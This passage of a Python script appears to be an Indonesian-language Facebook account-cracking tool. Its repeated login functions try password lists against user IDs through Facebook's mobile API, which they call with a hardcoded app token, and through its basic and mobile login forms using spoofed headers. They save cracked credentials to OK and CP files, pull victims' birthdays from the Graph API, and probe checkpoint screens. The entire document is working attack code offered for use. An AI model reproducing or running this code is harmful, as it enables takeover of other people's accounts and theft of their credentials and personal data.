        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B} |----> {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token = open("masuk.txt", "r").read()
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
                month, day, year = ttl.split("/")
                month = bulan[month]
                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            cek_log(uid,pw,ua)
            print(f"\r{B} |----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def apiiii(uid, jeeck):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token

    sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
    for pw in jeeck:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B} |----> {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token = open("masuk.txt", "r").read()
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
                month, day, year = ttl.split("/")
                month = bulan[month]
                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(f"\r{B} |----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def mbasic(uid, jeeck):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in jeeck:
		jck_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:jck_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		jck_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=jck_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("masuk.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasicc(uid, jeeck):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in jeeck:
		jck_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:jck_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		jck_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=jck_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("masuk.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mobil(uid, jeeck):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in jeeck:
		jck_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mobile.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:jck_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		jck_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=jck_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("masuk.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobill(uid, jeeck):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in jeeck:
		jck_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:jck_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		jck_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=jck_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("masuk.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def cek_log(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		tempek = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in tempek.find_all("option")]
		print(f"\r{P}[•]{K}-----> {B}{uid}•{pw}")
		for opt in range(len(ngew)):
			jalan(f"{U}[{B}{str(opt+1)}{U}]{B}>>>>>{U}[{B}{ngew[opt]}{U}")
		if "0" in str(len(ngew)):
			jalan(f"{P}[•]{I} Hore akunya tab yesss, silahkan di login ")
	elif "login_error" in str(run):
		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")
	else:
		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")





def folder():
    try:
        os.mkdir("CP")
    except:pass
    try:
        os.mkdir("OK")
    except:pass

if __name__=="__main__":
    os.system("git pull")
    folder()
    menu()
